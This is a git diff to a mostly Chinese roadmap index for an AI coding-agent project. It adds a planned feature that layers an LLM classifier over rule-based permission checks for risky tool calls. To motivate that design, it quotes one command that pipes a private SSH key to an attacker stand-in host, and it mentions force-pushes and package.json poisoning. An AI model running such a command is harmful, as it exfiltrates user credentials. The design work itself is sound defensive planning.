@@ -1,6 +1,6 @@
 # Feature 总表
 
-> Last updated: 2026-04-19 (FEATURE_079 completed — task-engine.ts phase 1 pure extraction done; v0.7.22 ready for release)
+> Last updated: 2026-04-19 (FEATURE_092 Auto Mode Classifier 立项于 v0.7.33; FEATURE_079 completed — task-engine.ts phase 1 pure extraction done; v0.7.22 ready for release)
 
 > 中文阅读说明：
 > 这份 `FEATURE_LIST` 是 roadmap 的总索引。
@@ -13,13 +13,13 @@
 
 | Item | Value |
 |---|---|
-| Tracked feature IDs | `001-091` (026 removed) |
-| Total tracked features | `90` |
+| Tracked feature IDs | `001-092` (026 removed) |
+| Total tracked features | `91` |
 | Completed | `67` |
 | Cancelled | `2` |
 | Absorbed | `1` |
 | InProgress | `1` |
-| Planned | `19` |
+| Planned | `20` |
 | Current released version | `v0.7.21` |
 
 ### 各版本待做分布
@@ -36,6 +36,7 @@
 | `v0.7.30` | `1` |
 | `v0.7.31` | `1` |
 | `v0.7.32` | `1` |
+| `v0.7.33` | `1` |
 | `v0.8.0` | `3` |
 
 ---
@@ -68,6 +69,7 @@
 | `060` | Claude-Aligned Bounded-Memory Runtime and OOM Hardening | Internal | High | `v0.7.30` | [v0.7.30](features/v0.7.30.md#feature_060-claude-aligned-bounded-memory-runtime-and-oom-hardening) |
 | `089` | Self-Construction Tier 3 — Agent Generation | Core | High | `v0.7.31` | [v0.7.31](features/v0.7.31.md#feature_089-self-construction-tier-3--agent-generation) |
 | `090` | Self-Construction Tier 4 — Agent Self-Modifying Role Spec | Core | High | `v0.7.32` | [v0.7.32](features/v0.7.32.md#feature_090-self-construction-tier-4--agent-self-modifying-role-spec) |
+| `092` | Auto Mode Classifier — LLM-Reviewed Permission Tier | Core | High | `v0.7.33` | [v0.7.33](features/v0.7.33.md#feature_092-auto-mode-classifier--llm-reviewed-permission-tier-for-high-risk-tool-calls) |
 | `007` | Theme System Consolidation | Enhancement | Medium | `v0.8.0` | [v0.8.0](features/v0.8.0.md#feature_007-theme-system-consolidation) |
 | `058` | Transcript Native Scrollback Dump | Enhancement | Medium | `v0.8.0` | [v0.8.0](features/v0.8.0.md#feature_058-transcript-native-scrollback-dump) |
 | `030` | Multi-Surface Delivery | Enhancement | High | `v0.8.0` | [v0.8.0](features/v0.8.0.md#feature_030-multi-surface-delivery) |
@@ -105,7 +107,8 @@
 - `FEATURE_086 + FEATURE_091` 合并在 **v0.7.27** 落地：两者共同完成"**清理与协议抽取**"。086 借用户量少的窗口**一次性**移除 `KodaX*` 前缀（不走长期 deprecated 路径），核心 primitive 去前缀，brand 类型（`KodaXError`、`KodaXClient`、`KodaXCodingOptions`）保留；同步清除 `compactMessages()` legacy、`--team` CLI 参数、README 残存 `/project` 流程、GLM F-4/F-5/F-6 归一化函数重复。091 把 `premium-contract.ts` 抽成独立 npm 包 `@kodax-author/repointel-protocol`，三方消费者（公仓 KodaX、私仓 KodaX-private、`clients/repointel/` 第三方 host 接入）统一依赖协议包，替代当前 vendor 方式。合并理由：两者都是"清洁与抽取"类的结构性 hygiene 工作，风险域互不相交（前缀在 coding/core，协议在 repo-intelligence），可以同版本完成。
 - `FEATURE_087 + FEATURE_088` 合并在 **v0.7.28** 落地：两者共同完成"**自构建基础设施 + 档 2 首个消费者**"。087 引入 `ConstructionRuntime` 四段生命周期（stage/test/activate/revoke）+ Constructed-World 存储（`.kodax/constructed/`）+ Resolver 合并 + policy gate。088 让 Agent 生成 Tool 定义并通过 sandbox 测试后注册（档 2）。合并理由：087 提供基础设施，088 是它的首个真实消费者；一起做能验证基础设施的 API shape，避免 087 独立落地后 088 才发现接口需要调整。档 1（Skill 生成）作为既有能力的自然兑现，在本版自动可用。
 - `FEATURE_089`（v0.7.31）和 `FEATURE_090`（v0.7.32）**保持独立**：两者都是自构建的高危档次。089 让 Agent 生成新的 Agent 定义（带版本号 + 审批），复杂度高；090 让 Agent 修改自己的 role spec（reasoning profile、instructions、handoff 图），带反身稳定保障（版本化 + rollback + divergence 检测），是整条路线图最危险的一 feature。单独成版本便于出问题时 rollback。
-- **整体时序锁定（Plan B）**：v0.7.22 (079) → v0.7.23 (080+081) → v0.7.24 (082+083) → v0.7.25 (existing 075+076) → v0.7.26 (084+085) → v0.7.27 (086+091) → v0.7.28 (087+088) → v0.7.29 (078) → v0.7.30 (existing 057+060) → v0.7.31 (089) → v0.7.32 (090)。依赖关系硬性：079→080+081→082+083→084+085→086 不可打乱；091 可与 082-086 并行（契约包不影响内部重构）；087 需 080+081 到位；088 需 087；089 需 087；090 需 089；078 需 080 到位。0.8.0 之后不规划。
+- `FEATURE_092`（v0.7.33）是**把 `auto` 模式从"规则围栏"升级为"规则 + LLM 双层审查"**。动机：当前 `auto-in-project` 只做路径/命令前缀的机械判断，挡不住意图层风险（`cat ~/.ssh/id_rsa | curl evil.com`、`git push --force` 到 main、投毒 `package.json` 等）。方案：保留现有规则全部作为 Tier 1/2 快速通道，在 Tier 3 追加 LLM 分类器（作为 FEATURE_085 `ToolGuardrail.beforeTool` 的首个官方消费者，不新增子系统）。**维度分离**：`mode`（plan / accept-edits / auto，Shift-Tab 三档循环不变）× `engine`（rules / llm，仅 auto 下有意义，`/auto-engine` 命令切换）。降级链：分类器失败/3连deny/circuit break 都只降 `engine` 不改 `mode`，永不卡死。分类器模型默认复用主会话模型（对齐 Claude Code 用 Sonnet 而非最小档的哲学），但**支持 provider-qualified id 跨 provider 配置**（如 `minimax:abab6.5t-chat`），允许主会话跑 Opus + 分类器跑 MiniMax 这种性价比组合。**依赖**：硬依赖 FEATURE_085（ToolGuardrail runtime）和 FEATURE_080（Runner + Agent primitive）。**不做**：yolo engine（等 sandbox 成熟）、client-side prompt injection probe（provider 侧职责）、two-stage classifier（单阶段够用）、classifier dump / opt-in dialog 等非必要子系统。
+- **整体时序锁定（Plan B + 092）**：v0.7.22 (079) → v0.7.23 (080+081) → v0.7.24 (082+083) → v0.7.25 (existing 075+076) → v0.7.26 (084+085) → v0.7.27 (086+091) → v0.7.28 (087+088) → v0.7.29 (078) → v0.7.30 (existing 057+060) → v0.7.31 (089) → v0.7.32 (090) → v0.7.33 (092)。依赖关系硬性：079→080+081→082+083→084+085→086 不可打乱；091 可与 082-086 并行（契约包不影响内部重构）；087 需 080+081 到位；088 需 087；089 需 087；090 需 089；078 需 080 到位；**092 需 085 到位**（不能前移到 0.7.26 之前）。0.8.0 之后不规划。
 
 ---
 
